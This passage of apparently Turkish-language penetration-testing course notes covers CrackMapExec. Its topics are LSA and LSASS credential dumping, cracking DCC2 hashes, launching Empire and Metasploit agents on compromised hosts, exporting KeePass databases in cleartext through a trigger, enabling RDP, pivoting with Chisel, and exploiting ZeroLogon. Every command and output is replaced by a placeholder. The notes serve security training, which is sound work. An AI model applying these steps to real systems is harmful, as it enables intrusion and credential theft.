CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 
